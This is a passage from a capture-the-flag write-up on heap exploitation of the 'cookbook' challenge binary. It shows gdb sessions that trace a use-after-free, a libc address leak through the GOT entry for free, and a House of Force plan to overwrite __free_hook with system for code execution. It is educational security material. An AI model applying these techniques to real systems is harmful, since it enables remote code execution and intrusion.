0x804d0a0:	0x0804f2b0
gdb-peda$ x/40wx 0x804f2b0
0x804f2b0:	0x0804f6c0	0x0804f6d0	0x00000000	0x00000000
0x804f2c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f300:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f310:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f320:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f330:	0x00000000	0x00000000	0x00000000	0x33393531
0x804f340:	0x38323735	0x0000000a	0x00000000	0x00000000
gdb-peda$ x/wx 0x804f6c0
0x804f6c0:	0x0804e050
gdb-peda$ x/3wx 0x804e050
0x804e050:	0x00000000	0x00000006	0x65746177
gdb-peda$ x/wx 0x804f6d0
0x804f6d0:	0x00000001
```

So we can see here is the memory for the recipe we created. We can see our ingredients, the ingredient counts, and the instructions for the recipe. Let's free this region of memory, then see what it looks like after it has been freed:

```
gdb-peda$ c
Continuing.
d
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
q
====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
^C
Program received signal SIGINT, Interrupt.

[----------------------------------registers-----------------------------------]
EAX: 0xfffffe00 
EBX: 0x0 
ECX: 0xf7fae5e7 --> 0xfaf87c0a 
EDX: 0x1 
ESI: 0xf7fae5a0 --> 0xfbad208b 
EDI: 0xf7fac960 --> 0x0 
EBP: 0xffffcf58 --> 0x9 ('\t')
ESP: 0xffffcf08 --> 0xffffcf58 --> 0x9 ('\t')
EIP: 0xf7fd7c89 (<__kernel_vsyscall+9>:	pop    ebp)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7fd7c83 <__kernel_vsyscall+3>:	mov    ebp,esp
   0xf7fd7c85 <__kernel_vsyscall+5>:	sysenter 
   0xf7fd7c87 <__kernel_vsyscall+7>:	int    0x80
=> 0xf7fd7c89 <__kernel_vsyscall+9>:	pop    ebp
   0xf7fd7c8a <__kernel_vsyscall+10>:	pop    edx
   0xf7fd7c8b <__kernel_vsyscall+11>:	pop    ecx
   0xf7fd7c8c <__kernel_vsyscall+12>:	ret    
   0xf7fd7c8d:	nop
[------------------------------------stack-------------------------------------]
0000| 0xffffcf08 --> 0xffffcf58 --> 0x9 ('\t')
0004| 0xffffcf0c --> 0x1 
0008| 0xffffcf10 --> 0xf7fae5e7 --> 0xfaf87c0a 
0012| 0xffffcf14 --> 0xf7ed03e3 (<read+35>:	pop    ebx)
0016| 0xffffcf18 --> 0xf7fac300 --> 0x0 
0020| 0xffffcf1c --> 0xf7e6362f (<_IO_file_underflow+303>:	add    esp,0x10)
0024| 0xffffcf20 --> 0x0 
0028| 0xffffcf24 --> 0xf7fae5e7 --> 0xfaf87c0a 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGINT
0xf7fd7c89 in __kernel_vsyscall ()
gdb-peda$ x/40wx 0x804f2b0
0x804f2b0:	0xf7fae7b0	0xf7fae7b0	0x00000000	0x00000000
0x804f2c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f300:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f310:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f320:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f330:	0x00000000	0x00000000	0x00000000	0x33393531
0x804f340:	0x38323735	0x0000000a	0x00000000	0x00000000
gdb-peda$ x/wx 0xf7fae7b0
0xf7fae7b0:	0x0804f6d8
```

So we can see that the pointers to ingredient counts and ingredient pointers have been written over with heap metadata (pointing to the next area of the heap which can be allocated). We can see that the recipe instructions remain there. Let's add an ingredient now and and see how this memory region looks:

```
gdb-peda$ c
Continuing.
a
====================
[l]ist current stats?
[n]ew ingredient?
[c]ontinue editing ingredient?
[d]iscard current ingredient?
[g]ive name to ingredient?
[p]rice ingredient?
[s]et calories?
[q]uit (doesn't save)?
[e]xport saving changes (doesn't quit)?
n
====================
[l]ist current stats?
[n]ew ingredient?
[c]ontinue editing ingredient?
[d]iscard current ingredient?
[g]ive name to ingredient?
[p]rice ingredient?
[s]et calories?
[q]uit (doesn't save)?
[e]xport saving changes (doesn't quit)?
g
0000
====================
[l]ist current stats?
[n]ew ingredient?
[c]ontinue editing ingredient?
[d]iscard current ingredient?
[g]ive name to ingredient?
[p]rice ingredient?
[s]et calories?
[q]uit (doesn't save)?
[e]xport saving changes (doesn't quit)?
p
1
====================
[l]ist current stats?
[n]ew ingredient?
[c]ontinue editing ingredient?
[d]iscard current ingredient?
[g]ive name to ingredient?
[p]rice ingredient?
[s]et calories?
[q]uit (doesn't save)?
[e]xport saving changes (doesn't quit)?
s
2
====================
[l]ist current stats?
[n]ew ingredient?
[c]ontinue editing ingredient?
[d]iscard current ingredient?
[g]ive name to ingredient?
[p]rice ingredient?
[s]et calories?
[q]uit (doesn't save)?
[e]xport saving changes (doesn't quit)?
^C
Program received signal SIGINT, Interrupt.

[----------------------------------registers-----------------------------------]
EAX: 0xfffffe00 
EBX: 0x0 
ECX: 0xf7fae5e7 --> 0xfaf87c0a 
EDX: 0x1 
ESI: 0xf7fae5a0 --> 0xfbad208b 
EDI: 0xf7fac960 --> 0x0 
EBP: 0xffffcf18 --> 0x9 ('\t')
ESP: 0xffffcec8 --> 0xffffcf18 --> 0x9 ('\t')
EIP: 0xf7fd7c89 (<__kernel_vsyscall+9>:	pop    ebp)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7fd7c83 <__kernel_vsyscall+3>:	mov    ebp,esp
   0xf7fd7c85 <__kernel_vsyscall+5>:	sysenter 
   0xf7fd7c87 <__kernel_vsyscall+7>:	int    0x80
=> 0xf7fd7c89 <__kernel_vsyscall+9>:	pop    ebp
   0xf7fd7c8a <__kernel_vsyscall+10>:	pop    edx
   0xf7fd7c8b <__kernel_vsyscall+11>:	pop    ecx
   0xf7fd7c8c <__kernel_vsyscall+12>:	ret    
   0xf7fd7c8d:	nop
[------------------------------------stack-------------------------------------]
0000| 0xffffcec8 --> 0xffffcf18 --> 0x9 ('\t')
0004| 0xffffcecc --> 0x1 
0008| 0xffffced0 --> 0xf7fae5e7 --> 0xfaf87c0a 
0012| 0xffffced4 --> 0xf7ed03e3 (<read+35>:	pop    ebx)
0016| 0xffffced8 --> 0xf7fac300 --> 0x0 
0020| 0xffffcedc --> 0xf7e6362f (<_IO_file_underflow+303>:	add    esp,0x10)
0024| 0xffffcee0 --> 0x0 
0028| 0xffffcee4 --> 0xf7fae5e7 --> 0xfaf87c0a 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGINT
0xf7fd7c89 in __kernel_vsyscall ()
gdb-peda$ x/wx 0x804d09c
0x804d09c:	0x0804f2b0
gdb-peda$ x/40wx 0x804f2b0
0x804f2b0:	0x00000002	0x00000001	0x30303030	0x00000000
0x804f2c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f300:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f310:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f320:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f330:	0x00000000	0x00000000	0x00000000	0x0804f2b0
0x804f340:	0x38323735	0x00000379	0xf7fae7b0	0xf7fae7b0
gdb-peda$ x/wx 0x804d0a0 
0x804d0a0:	0x0804f2b0
gdb-peda$ 
```

So we can see that the instructions we had at `0x804f33c` for the recipe have been overwritten with a pointer to the ingredient (which we can see the calories, price, and name starting at `0x804f2b0`). Because of it's position being in the exact spot that the instructions were at, we should be able to make a new recipe and overwrite that pointer since `cur_rec` is still pointing to `0x804f2b0`.

```
gdb-peda$ c
Continuing.
e
saved!
====================
[l]ist current stats?
[n]ew ingredient?
[c]ontinue editing ingredient?
[d]iscard current ingredient?
[g]ive name to ingredient?
[p]rice ingredient?
[s]et calories?
[q]uit (doesn't save)?
[e]xport saving changes (doesn't quit)?
q
====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
c
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
i
7895
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
^C
Program received signal SIGINT, Interrupt.

[----------------------------------registers-----------------------------------]
EAX: 0xfffffe00 
EBX: 0x0 
ECX: 0xf7fae5e7 --> 0xfaf87c0a 
EDX: 0x1 
ESI: 0xf7fae5a0 --> 0xfbad208b 
EDI: 0xf7fac960 --> 0x0 
EBP: 0xffffce78 --> 0x9 ('\t')
ESP: 0xffffce28 --> 0xffffce78 --> 0x9 ('\t')
EIP: 0xf7fd7c89 (<__kernel_vsyscall+9>:	pop    ebp)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7fd7c83 <__kernel_vsyscall+3>:	mov    ebp,esp
   0xf7fd7c85 <__kernel_vsyscall+5>:	sysenter 
   0xf7fd7c87 <__kernel_vsyscall+7>:	int    0x80
=> 0xf7fd7c89 <__kernel_vsyscall+9>:	pop    ebp
   0xf7fd7c8a <__kernel_vsyscall+10>:	pop    edx
   0xf7fd7c8b <__kernel_vsyscall+11>:	pop    ecx
   0xf7fd7c8c <__kernel_vsyscall+12>:	ret    
   0xf7fd7c8d:	nop
[------------------------------------stack-------------------------------------]
0000| 0xffffce28 --> 0xffffce78 --> 0x9 ('\t')
0004| 0xffffce2c --> 0x1 
0008| 0xffffce30 --> 0xf7fae5e7 --> 0xfaf87c0a 
0012| 0xffffce34 --> 0xf7ed03e3 (<read+35>:	pop    ebx)
0016| 0xffffce38 --> 0xf7fac300 --> 0x0 
0020| 0xffffce3c --> 0xf7e6362f (<_IO_file_underflow+303>:	add    esp,0x10)
0024| 0xffffce40 --> 0x0 
0028| 0xffffce44 --> 0xf7fae5e7 --> 0xfaf87c0a 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGINT
0xf7fd7c89 in __kernel_vsyscall ()
gdb-peda$ x/40wx 0x804f2b0
0x804f2b0:	0x00000002	0x00000001	0x30303030	0x00000000
0x804f2c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f300:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f310:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f320:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f330:	0x00000000	0x00000000	0x00000000	0x35393837
0x804f340:	0x3832000a	0x00000011	0x0804f2b0	0x00000000
```

So we can see that the pointer to our new ingredient is at `0x804f348`, and is within the range of the write we get for making instructions which starts at `0x804f33c`. So using this, we can overwrite the pointer for this new ingredient by writing `'0'*12 + x` where x is the value we are replacing the pointer with.

Now with this we can get another infoleak, this time to libc. Looking at the `print_ingredient_properties()` function we can see that it is expecting a pointer to print out. We should be able to overwrite the ingredient pointer with a GOT table address for a libc function, which will store the actual libc address for that function. Because of this, when we trigger the option for listing the ingredients, it will print out that libc address, plus two other address 4 and 8 bytes down.

Let's find a got address for the function `free`:

```
$	readelf --relocs ./cookbook | grep free
0804d018  00000407 R_386_JUMP_SLOT   00000000   free@GLIBC_2.0
```

So if we overwrite the address of our new ingredient with `0x804d018` it should print out the address of free, and with that we can break ASLR in libc. 

Now one thing to remember about doing this write, since we are dealing with a linked list, it will expect a pointer to the next item right after the current pointer (unless if there are no more, which is signified by 0x00000000). SInce our input is scanned in using `fgets()`, there will be a trailing newline character which will get written to the location that it will expect the next pointer, so we will need to add four null bytes, otherwise it will try to interpret `0xa` as a pointer and crash.

Also the whole reason we are able to do this, is because `cur_rec` is not reset to 0 after the pointer it contains is freed.

## Write

So we have broken ASLR in the heap and libc, and have a use after free vulnerabillity that we can use. Now the question is how to get remote code execution.

In C, the free function has hooks, which will allow the programmer to add additional functionallity to the function (helpful for debugging). If we can overwrite the free hook with the address of system, and pass it a char pointer which we control then we will have remote code execution. Before we do that though we will need to write to the free hook. To do this, we can use an exploit based off The House of Force. Esentially we will expand overwrite the last heap value before the wilderness (where the heap space isn't allocated) which specifies how much space is left in the heap (I call it the wilderness value) with `0xffffffff` so the program doesn't try to grab more space with `mmap`. Then we will overwrite the pointer which points to the netx available heap space with that of the free hook, so the next time we allocate space in the heap, we will be writing to the free hook. 

tl;dr expand heap into the rest of the memory, overwrite pointer to next available heap block with free hook, overwrite free hook

#### Finding Free Hook

First let's see where the free hook lives. Before we do that, let's look at the assembly code for free:


```
=> 0xf7f1b625:	mov    ebx,DWORD PTR [esp]
   0xf7f1b628:	ret    
```

```
gdb-peda$ x/90i 0xf7e6adc0
=> 0xf7e6adc0 <free>:	push   ebx
   0xf7e6adc1 <free+1>:	call   0xf7f1b625
   0xf7e6adc6 <free+6>:	add    ebx,0x14323a
   0xf7e6adcc <free+12>:	sub    esp,0x8
   0xf7e6adcf <free+15>:	mov    eax,DWORD PTR [ebx-0x98]
   0xf7e6add5 <free+21>:	mov    ecx,DWORD PTR [esp+0x10]
   0xf7e6add9 <free+25>:	mov    eax,DWORD PTR [eax]
   0xf7e6addb <free+27>:	test   eax,eax
   0xf7e6addd <free+29>:	jne    0xf7e6ae50 <free+144>
```

So we can see here the value of `ebx` is just the stack pointer . Then it has the hex string `0x1432a` added to it, then has `0x98` subtracted from it before it is moved into `eax` to be used aas the free hook. Then it checks to see if it actually points anything (checks to see if there is a hook) and if there is, it will jump to the part where it will execute the hook. 

```
   0xf7e6ae50 <free+144>:	sub    esp,0x8
   0xf7e6ae53 <free+147>:	push   DWORD PTR [esp+0x14]
   0xf7e6ae57 <free+151>:	push   ecx
   0xf7e6ae58 <free+152>:	call   eax
```

Here we can see it calls `eax` which has the web hook from the previous block. Let's see where the free hook is in memory:

```
gdb-peda$ b free
Breakpoint 1 at 0x8048530
gdb-peda$ r
Starting program: /Hackery/bkp16/cookbook/cookbook 
what's your name?
guyinatuxedo
+-----------------------------+
|          .--,--.            |
|          `.  ,.'            |
|           |___|             |
|           :o o:             |
|          _`~^~'             |
|        /'   ^   `\          |
| cooking manager pro v6.1... |
+-----------------------------+
====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
g
how long is the name of your cookbook? (hex because you're both a chef and a hacker!) : 0x50
15935728
the new name of the cookbook is 15935728

====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
R

[----------------------------------registers-----------------------------------]
EAX: 0x804f2b0 ("15935728\n")
EBX: 0xffffd130 --> 0x1 
ECX: 0xffffd0f2 --> 0xa5000a52 
EDX: 0xf7faf87c --> 0x0 
ESI: 0x1 
EDI: 0xf7fae000 --> 0x1b5db0 
EBP: 0xffffd048 --> 0xffffd108 --> 0xffffd118 --> 0x0 
ESP: 0xffffd02c --> 0x8048b62 (add    esp,0x10)
EIP: 0xf7e6adc0 (<free>:	push   ebx)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7e6adad:	jmp    0xf7e6abb4
   0xf7e6adb2:	lea    esi,[esi+eiz*1+0x0]
   0xf7e6adb9:	lea    edi,[edi+eiz*1+0x0]
=> 0xf7e6adc0 <free>:	push   ebx
   0xf7e6adc1 <free+1>:	call   0xf7f1b625
   0xf7e6adc6 <free+6>:	add    ebx,0x14323a
   0xf7e6adcc <free+12>:	sub    esp,0x8
   0xf7e6adcf <free+15>:	mov    eax,DWORD PTR [ebx-0x98]
[------------------------------------stack-------------------------------------]
0000| 0xffffd02c --> 0x8048b62 (add    esp,0x10)
0004| 0xffffd030 --> 0x804f2b0 ("15935728\n")
0008| 0xffffd034 --> 0xf7fae000 --> 0x1b5db0 
0012| 0xffffd038 --> 0xffffd108 --> 0xffffd118 --> 0x0 
0016| 0xffffd03c --> 0x8048a20 (add    esp,0x10)
0020| 0xffffd040 --> 0xffffd0f2 --> 0xa5000a52 
0024| 0xffffd044 --> 0xa ('\n')
0028| 0xffffd048 --> 0xffffd108 --> 0xffffd118 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0xf7e6adc0 in free () from /lib/i386-linux-gnu/libc.so.6
gdb-peda$ si
```

step through the instructions untill you hit free+25

```
[----------------------------------registers-----------------------------------]
EAX: 0xf7faf8b0 --> 0x0 
EBX: 0xf7fae000 --> 0x1b5db0 
ECX: 0xffffd0f2 --> 0xa5000a52 
EDX: 0xf7faf87c --> 0x0 
ESI: 0x1 
EDI: 0xf7fae000 --> 0x1b5db0 
EBP: 0xffffd048 --> 0xffffd108 --> 0xffffd118 --> 0x0 
ESP: 0xffffd020 --> 0x804f2b0 ("15935728\n")
EIP: 0xf7e6add5 (<free+21>:	mov    ecx,DWORD PTR [esp+0x10])
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7e6adc6 <free+6>:	add    ebx,0x14323a
   0xf7e6adcc <free+12>:	sub    esp,0x8
   0xf7e6adcf <free+15>:	mov    eax,DWORD PTR [ebx-0x98]
=> 0xf7e6add5 <free+21>:	mov    ecx,DWORD PTR [esp+0x10]
   0xf7e6add9 <free+25>:	mov    eax,DWORD PTR [eax]
   0xf7e6addb <free+27>:	test   eax,eax
   0xf7e6addd <free+29>:	jne    0xf7e6ae50 <free+144>
   0xf7e6addf <free+31>:	test   ecx,ecx
[------------------------------------stack-------------------------------------]
0000| 0xffffd020 --> 0x804f2b0 ("15935728\n")
0004| 0xffffd024 --> 0xf7e6adc6 (<free+6>:	add    ebx,0x14323a)
0008| 0xffffd028 --> 0xffffd130 --> 0x1 
0012| 0xffffd02c --> 0x8048b62 (add    esp,0x10)
0016| 0xffffd030 --> 0x804f2b0 ("15935728\n")
0020| 0xffffd034 --> 0xf7fae000 --> 0x1b5db0 
0024| 0xffffd038 --> 0xffffd108 --> 0xffffd118 --> 0x0 
0028| 0xffffd03c --> 0x8048a20 (add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0xf7e6add5 in free () from /lib/i386-linux-gnu/libc.so.6
gdb-peda$ si

[----------------------------------registers-----------------------------------]
EAX: 0xf7faf8b0 --> 0x0 
EBX: 0xf7fae000 --> 0x1b5db0 
ECX: 0x804f2b0 ("15935728\n")
EDX: 0xf7faf87c --> 0x0 
ESI: 0x1 
EDI: 0xf7fae000 --> 0x1b5db0 
EBP: 0xffffd048 --> 0xffffd108 --> 0xffffd118 --> 0x0 
ESP: 0xffffd020 --> 0x804f2b0 ("15935728\n")
EIP: 0xf7e6add9 (<free+25>:	mov    eax,DWORD PTR [eax])
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7e6adcc <free+12>:	sub    esp,0x8
   0xf7e6adcf <free+15>:	mov    eax,DWORD PTR [ebx-0x98]
   0xf7e6add5 <free+21>:	mov    ecx,DWORD PTR [esp+0x10]
=> 0xf7e6add9 <free+25>:	mov    eax,DWORD PTR [eax]
   0xf7e6addb <free+27>:	test   eax,eax
   0xf7e6addd <free+29>:	jne    0xf7e6ae50 <free+144>
   0xf7e6addf <free+31>:	test   ecx,ecx
   0xf7e6ade1 <free+33>:	je     0xf7e6ae5d <free+157>
[------------------------------------stack-------------------------------------]
0000| 0xffffd020 --> 0x804f2b0 ("15935728\n")
0004| 0xffffd024 --> 0xf7e6adc6 (<free+6>:	add    ebx,0x14323a)
0008| 0xffffd028 --> 0xffffd130 --> 0x1 
0012| 0xffffd02c --> 0x8048b62 (add    esp,0x10)
0016| 0xffffd030 --> 0x804f2b0 ("15935728\n")
0020| 0xffffd034 --> 0xf7fae000 --> 0x1b5db0 
0024| 0xffffd038 --> 0xffffd108 --> 0xffffd118 --> 0x0 
0028| 0xffffd03c --> 0x8048a20 (add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0xf7e6add9 in free () from /lib/i386-linux-gnu/libc.so.6
gdb-peda$ p $eax
$1 = 0xf7faf8b0
gdb-peda$ x/wx 0xf7faf8b0
0xf7faf8b0 <__free_hook>:	0x00000000
gdb-peda$ info proc mapping
process 15984
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x804c000     0x4000        0x0 /Hackery/bkp16/cookbook/cookbook
	 0x804c000  0x804d000     0x1000     0x3000 /Hackery/bkp16/cookbook/cookbook
	 0x804d000  0x804e000     0x1000     0x4000 /Hackery/bkp16/cookbook/cookbook
	 0x804e000  0x806f000    0x21000        0x0 [heap]
	0xf7df8000 0xf7fac000   0x1b4000        0x0 /lib/i386-linux-gnu/libc-2.24.so
	0xf7fac000 0xf7fae000     0x2000   0x1b3000 /lib/i386-linux-gnu/libc-2.24.so
	0xf7fae000 0xf7faf000     0x1000   0x1b5000 /lib/i386-linux-gnu/libc-2.24.so
	0xf7faf000 0xf7fb2000     0x3000        0x0 
	0xf7fd2000 0xf7fd5000     0x3000        0x0 
	0xf7fd5000 0xf7fd7000     0x2000        0x0 [vvar]
	0xf7fd7000 0xf7fd9000     0x2000        0x0 [vdso]
	0xf7fd9000 0xf7ffc000    0x23000        0x0 /lib/i386-linux-gnu/ld-2.24.so
	0xf7ffc000 0xf7ffd000     0x1000    0x22000 /lib/i386-linux-gnu/ld-2.24.so
	0xf7ffd000 0xf7ffe000     0x1000    0x23000 /lib/i386-linux-gnu/ld-2.24.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
```

So we can see here, the webhook is at `0xf7faf8b0` which is stored in libc between `0xf7faf000` & `0xf7fb2000`. Let's follow the process when we actually set the webhook (we will just be setting it to `0000`):

```
gdb-peda$ set {int}0xf7faf8b0 = 0x30303030
gdb-peda$ x/wx 0xf7faf8b0
0xf7faf8b0 <__free_hook>:	0x30303030
gdb-peda$ si
```

and after we step through the instructions untill the call

```
[----------------------------------registers-----------------------------------]
EAX: 0x30303030 ('0000')
EBX: 0xf7fae000 --> 0x1b5db0 
ECX: 0x804f2b0 ("15935728\n")
EDX: 0xf7faf87c --> 0x0 
ESI: 0x1 
EDI: 0xf7fae000 --> 0x1b5db0 
EBP: 0xffffd048 --> 0xffffd108 --> 0xffffd118 --> 0x0 
ESP: 0xffffd00c --> 0xf7e6ae5a (<free+154>:	add    esp,0x10)
EIP: 0x30303030 ('0000')
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x30303030
[------------------------------------stack-------------------------------------]
0000| 0xffffd00c --> 0xf7e6ae5a (<free+154>:	add    esp,0x10)
0004| 0xffffd010 --> 0x804f2b0 ("15935728\n")
0008| 0xffffd014 --> 0x8048b62 (add    esp,0x10)
0012| 0xffffd018 --> 0xf7faf87c --> 0x0 
0016| 0xffffd01c --> 0xf7e6adc0 (<free>:	push   ebx)
0020| 0xffffd020 --> 0x804f2b0 ("15935728\n")
0024| 0xffffd024 --> 0xf7e6adc6 (<free+6>:	add    ebx,0x14323a)
0028| 0xffffd028 --> 0xffffd130 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x30303030 in ?? ()
```

So we can see that it did try to execute the value of the web hook, `0000`. Later on, we can just compare the address of `free` to the address of the free hook to get the offset, which is `0x144af0`. Now let's overwrite the wilderness value:

#### Wilderness

To do this, we are going to create a stale pointer using the use after free vulnerabillity with create recipe. Let's see what the heap looks like after the memory has been freed:

```
gdb-peda$ r
Starting program: /Hackery/bkp16/cookbook/cookbook 
what's your name?
guyinatuxedo
+-----------------------------+
|          .--,--.            |
|          `.  ,.'            |
|           |___|             |
|           :o o:             |
|          _`~^~'             |
|        /'   ^   `\          |
| cooking manager pro v6.1... |
+-----------------------------+
====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
c
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
n
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
i
15935728
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
a
which ingredient to add? water
how many? (hex): 0x1
nice
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
d
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
^C
Program received signal SIGINT, Interrupt.

[----------------------------------registers-----------------------------------]
EAX: 0xfffffe00 
EBX: 0x0 
ECX: 0xf7fae5e7 --> 0xfaf87c0a 
EDX: 0x1 
ESI: 0xf7fae5a0 --> 0xfbad208b 
EDI: 0xf7fac960 --> 0x0 
EBP: 0xffffce78 --> 0x9 ('\t')
ESP: 0xffffce28 --> 0xffffce78 --> 0x9 ('\t')
EIP: 0xf7fd7c89 (<__kernel_vsyscall+9>:	pop    ebp)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7fd7c83 <__kernel_vsyscall+3>:	mov    ebp,esp
   0xf7fd7c85 <__kernel_vsyscall+5>:	sysenter 
   0xf7fd7c87 <__kernel_vsyscall+7>:	int    0x80
=> 0xf7fd7c89 <__kernel_vsyscall+9>:	pop    ebp
   0xf7fd7c8a <__kernel_vsyscall+10>:	pop    edx
   0xf7fd7c8b <__kernel_vsyscall+11>:	pop    ecx
   0xf7fd7c8c <__kernel_vsyscall+12>:	ret    
   0xf7fd7c8d:	nop
[------------------------------------stack-------------------------------------]
0000| 0xffffce28 --> 0xffffce78 --> 0x9 ('\t')
0004| 0xffffce2c --> 0x1 
0008| 0xffffce30 --> 0xf7fae5e7 --> 0xfaf87c0a 
0012| 0xffffce34 --> 0xf7ed03e3 (<read+35>:	pop    ebx)
0016| 0xffffce38 --> 0xf7fac300 --> 0x0 
0020| 0xffffce3c --> 0xf7e6362f (<_IO_file_underflow+303>:	add    esp,0x10)
0024| 0xffffce40 --> 0x0 
0028| 0xffffce44 --> 0xf7fae5e7 --> 0xfaf87c0a 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGINT
0xf7fd7c89 in __kernel_vsyscall ()
gdb-peda$ x/40wx 0x804f2b0
0x804f2b0:	0xf7fae7b0	0xf7fae7b0	0x00000000	0x00000000
0x804f2c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f300:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f310:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f320:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f330:	0x00000000	0x00000000	0x00000000	0x33393531
0x804f340:	0x38323735	0x0000000a	0x00000000	0x00000000
```

So we can see here what we saw before. The pointers for the ingredients and the ingredient counts have been overwritten with the wilderness values. Let's see what the heap looks like after we have allocated some ingredients.

```
q
====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
a
====================
[l]ist current stats?
[n]ew ingredient?
[c]ontinue editing ingredient?
[d]iscard current ingredient?
[g]ive name to ingredient?
[p]rice ingredient?
[s]et calories?
[q]uit (doesn't save)?
[e]xport saving changes (doesn't quit)?
n
====================
[l]ist current stats?
[n]ew ingredient?
[c]ontinue editing ingredient?
[d]iscard current ingredient?
[g]ive name to ingredient?
[p]rice ingredient?
[s]et calories?
[q]uit (doesn't save)?
[e]xport saving changes (doesn't quit)?
^C
Program received signal SIGINT, Interrupt.

[----------------------------------registers-----------------------------------]
EAX: 0xfffffe00 
